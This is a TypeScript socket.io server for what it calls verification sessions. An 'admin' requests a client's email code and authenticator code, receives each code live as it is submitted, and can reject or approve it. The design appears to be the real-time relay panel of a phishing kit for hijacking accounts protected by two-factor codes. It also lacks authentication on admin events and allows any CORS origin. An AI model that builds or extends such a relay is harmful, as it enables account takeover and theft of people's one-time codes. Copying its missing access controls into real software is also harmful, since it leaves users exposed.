import { Server as HTTPServer } from "http";
import { Server as SocketIOServer, Socket } from "socket.io";

// Store active verification sessions
const activeSessions = new Map<string, {
  sessionId: string;
  clientLoginDataId: number;
  socket: Socket;
  status: string;
  emailCode?: string;
  authCode?: string;
}>();

export function setupWebSocket(httpServer: HTTPServer) {
  const io = new SocketIOServer(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"],
    },
  });

  io.on("connection", (socket: Socket) => {
    console.log(`[WebSocket] Client connected: ${socket.id}`);

    // Client joins verification session
    socket.on("join_verification", (data: { sessionId: string; clientLoginDataId: number }) => {
      const { sessionId, clientLoginDataId } = data;
      
      activeSessions.set(sessionId, {
        sessionId,
        clientLoginDataId,
        socket,
        status: "pending",
      });

      console.log(`[WebSocket] Client joined verification session: ${sessionId}`);
      socket.join(`verification_${sessionId}`);
      socket.join(`admin_verification_${clientLoginDataId}`);
    });

    // Admin requests email code
    socket.on("request_email_code", (data: { clientLoginDataId: number }) => {
      const { clientLoginDataId } = data;
      io.to(`admin_verification_${clientLoginDataId}`).emit("email_code_requested");
      console.log(`[WebSocket] Admin requested email code for client: ${clientLoginDataId}`);
    });

    // Admin requests auth code
    socket.on("request_auth_code", (data: { clientLoginDataId: number }) => {
      const { clientLoginDataId } = data;
      io.to(`admin_verification_${clientLoginDataId}`).emit("auth_code_requested");
      console.log(`[WebSocket] Admin requested auth code for client: ${clientLoginDataId}`);
    });

    // Client submits email code
    socket.on("submit_email_code", (data: { sessionId: string; code: string }) => {
      const { sessionId, code } = data;
      const session = activeSessions.get(sessionId);
      
      if (session) {
        session.emailCode = code;
        session.status = "email_code_submitted";
        
        // Notify admin
        io.to(`admin_verification_${session.clientLoginDataId}`).emit("email_code_submitted", {
          code,
          clientLoginDataId: session.clientLoginDataId,
        });
        
        console.log(`[WebSocket] Client submitted email code for session: ${sessionId}`);
      }
    });

    // Client submits auth code
    socket.on("submit_auth_code", (data: { sessionId: string; code: string }) => {
      const { sessionId, code } = data;
      const session = activeSessions.get(sessionId);
      
      if (session) {
        session.authCode = code;
        session.status = "auth_code_submitted";
        
        // Notify admin
        io.to(`admin_verification_${session.clientLoginDataId}`).emit("auth_code_submitted", {
          code,
          clientLoginDataId: session.clientLoginDataId,
        });
        
        console.log(`[WebSocket] Client submitted auth code for session: ${sessionId}`);
      }
    });

    // Admin rejects code
    socket.on("reject_code", (data: { clientLoginDataId: number; codeType: string; reason: string }) => {
      const { clientLoginDataId, codeType, reason } = data;
      io.to(`admin_verification_${clientLoginDataId}`).emit("code_rejected", {
        codeType,
        reason,
      });
      console.log(`[WebSocket] Admin rejected ${codeType} for client: ${clientLoginDataId}`);
    });

    // Admin approves verification
    socket.on("approve_verification", (data: { clientLoginDataId: number }) => {
      const { clientLoginDataId } = data;
      io.to(`admin_verification_${clientLoginDataId}`).emit("verification_approved");
      console.log(`[WebSocket] Admin approved verification for client: ${clientLoginDataId}`);
    });

    // Client disconnects
    socket.on("disconnect", () => {
    // Find and remove session
    activeSessions.forEach((session, sessionId) => {
      if (session.socket.id === socket.id) {
        activeSessions.delete(sessionId);
        console.log(`[WebSocket] Client disconnected from session: ${sessionId}`);
      }
    });
      console.log(`[WebSocket] Client disconnected: ${socket.id}`);
    });
  });

  return io;
}

export function getActiveSessions() {
  return activeSessions;
}
